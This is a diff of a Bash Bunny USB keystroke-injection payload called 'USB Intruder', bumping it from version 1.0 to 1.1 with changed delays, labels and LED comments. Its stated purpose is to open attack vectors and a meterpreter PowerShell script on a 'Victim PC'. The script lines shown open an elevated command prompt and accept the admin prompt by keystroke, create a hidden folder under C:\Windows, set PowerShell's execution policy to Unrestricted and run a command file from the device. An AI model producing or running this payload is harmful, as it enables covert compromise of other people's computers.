@@ -2,17 +2,18 @@
 #
 #TITLE: USB Intruder
 #AUTHOR: B0rk
-#VERSION: 1.0
-#PROPS: Hak5Darren, Diggster, IMcPwn
-#OS: Windows (Requires Powershell and Admin Rights)
-#ATTACKMODE: HID STORAGE
+#VERSION: 1.1
+#PROPS: Hak5Darren, Diggster, IMcPwn and many more
+#OS: Windows (Requires Powershell and Admin privs)
+#ATTACKMODES: HID STORAGE
 #
 #DESCRIPTION: Opens up attack vectors and a meterpreter powershell script on a Victim PC. **Based on usb_exfiltrator by DK & Friends**
 #
 #LED INDICATORS:
 #White - Initialization
-#Blue Blinking - phase 1
+#Blue Blinking - HID/STORAGE Phase
 #Yellow Blinking - Cleanup
+#Green Blinking - Syncing BB for removal
 #Green - Attack Completion
 
 #Initialization - Setting AttackModes
@@ -20,7 +21,7 @@ LED W
 ATTACKMODE HID STORAGE
 #Initialization Completed
 
-#Beginning of phase 1
+#Beginning of HID/STORAGE Phase
 LED B 10
 #Description::
 Q DELAY 2000
@@ -30,16 +31,16 @@ Q GUI r
 Q DELAY 500
 Q STRING powershell -Command "Start-Process cmd -Verb RunAs"
 Q ENTER
-Q DELAY 800
+Q DELAY 1000
 Q ALT y
-Q DELAY 500
+Q DELAY 800
 Q STRING mkdir C:\\Windows\\ProgData
 Q ENTER
 Q STRING attrib +h C:\\Windows\\ProgData
 Q ENTER
 Q STRING powershell
 Q ENTER
-Q DELAY 500
+Q DELAY 800
 Q STRING Set-ExecutionPolicy Unrestricted
 Q ENTER
 Q STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
@@ -57,7 +58,7 @@ Q ENTER
 Q STRING exit
 Q ENTER
 Q DELAY 500
-#End of phase 1
+#End of HID/STORAGE Phase
 
 #Cleanup
 LED Y 100
